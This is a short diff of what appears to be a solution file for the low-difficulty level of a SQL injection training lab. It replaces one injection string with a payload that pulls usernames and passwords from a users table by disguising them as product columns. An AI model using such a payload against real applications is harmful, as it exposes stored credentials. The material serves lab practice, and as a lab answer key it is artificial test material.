@@ -1,3 +1,3 @@
 # Low Difficulty
 
-`%';select * from users where username like '`
+`%';select username as product_id, password as price, NULL as name from users where username like '`
